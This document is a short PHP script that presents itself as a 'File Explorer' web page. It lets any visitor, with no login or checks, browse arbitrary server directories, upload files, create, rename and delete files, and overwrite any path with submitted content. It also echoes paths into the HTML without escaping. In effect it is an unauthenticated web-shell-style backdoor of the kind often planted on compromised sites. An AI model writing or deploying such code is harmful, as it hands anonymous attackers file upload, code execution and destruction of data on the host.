<?php
// Default current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = realpath($currentDir);

// =============================
// File Upload
// =============================
if (!empty($_FILES['file_to_upload'])) {
    $destination = $currentDir . '/' . basename($_FILES['file_to_upload']['name']);
    move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $destination);
    header("Location: ?dir=" . $currentDir);
    exit;
}

// =============================
// Create New Directory
// =============================
if (!empty($_POST['folder_name'])) {
    @mkdir($currentDir . '/' . $_POST['folder_name']);
    header("Location: ?dir=" . $currentDir);
    exit;
}

// =============================
// Delete File or Directory
// =============================
if (!empty($_GET['remove'])) {
    $targetPath = realpath($currentDir . '/' . $_GET['remove']);
    if (is_dir($targetPath)) {
        @rmdir($targetPath);
    } else {
        @unlink($targetPath);
    }
    header("Location: ?dir=" . $currentDir);
    exit;
}

// =============================
// Rename File or Directory
// =============================
if (!empty($_POST['old_name']) && !empty($_POST['new_name'])) {
    @rename($currentDir . '/' . $_POST['old_name'], $currentDir . '/' . $_POST['new_name']);
    header("Location: ?dir=" . $currentDir);
    exit;
}

// =============================
// Save File Changes
// =============================
if (!empty($_POST['save_path']) && isset($_POST['save_content'])) {
    file_put_contents($_POST['save_path'], $_POST['save_content']);
    header("Location: ?dir=" . dirname($_POST['save_path']));
    exit;
}

// =============================
// UI: Header + Upload + Folder Form
// =============================
$entries = scandir($currentDir);

echo "<h2>📂 File Explorer: {$currentDir}</h2>";
echo "<a href='?dir=" . dirname($currentDir) . "'>⬅ Back</a><br><br>";

echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file' name='file_to_upload'>
        <button type='submit'>Upload</button>
      </form>";

echo "<form method='POST'>
        <input type='text' name='folder_name' placeholder='New Folder'>
        <button type='submit'>Create</button>
      </form><br>";

// =============================
// Table: Files & Folders
// =============================
echo "<table border='1' cellpadding='5'>
        <tr><th>Name</th><th>Actions</th></tr>";

foreach ($entries as $entry) {
    if (in_array($entry, ['.', '..'])) continue;
    $fullPath = $currentDir . '/' . $entry;

    echo "<tr><td>";
    if (is_dir($fullPath)) {
        echo "<a href='?dir={$fullPath}'>📁 {$entry}</a>";
    } else {
        echo "📄 {$entry}";
    }
    echo "</td><td>";

    // Rename form
    echo "<form method='POST' style='display:inline'>
            <input type='hidden' name='old_name' value='{$entry}'>
            <input type='text' name='new_name' placeholder='Rename to'>
            <button type='submit'>Rename</button>
          </form>";

    // Delete link
    echo " <a href='?dir={$currentDir}&remove={$entry}' onclick='return confirm(\"Delete {$entry}?\")'>🗑 Delete</a>";

    // Download & Edit for files only
    if (is_file($fullPath)) {
        $relative = str_replace($_SERVER['DOCUMENT_ROOT'], '', $fullPath);
        echo " | <a href='{$relative}' download>⬇ Download</a>";
        echo " | <a href='?dir={$currentDir}&edit={$entry}'>✏ Edit</a>";
    }

    echo "</td></tr>";
}

echo "</table>";

// =============================
// File Editor
// =============================
if (!empty($_GET['edit'])) {
    $fileToEdit = $currentDir . '/' . $_GET['edit'];
    if (is_file($fileToEdit) && is_readable($fileToEdit)) {
        $fileContent = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h3>Editing: {$_GET['edit']}</h3>";
        echo "<form method='POST'>
                <input type='hidden' name='save_path' value='" . htmlspecialchars($fileToEdit) . "'>
                <textarea name='save_content' rows='20' cols='100'>{$fileContent}</textarea><br>
                <button type='submit'>💾 Save</button>
              </form>";
    } else {
        echo "<p>❌ File cannot be opened.</p>";
    }
}
?>
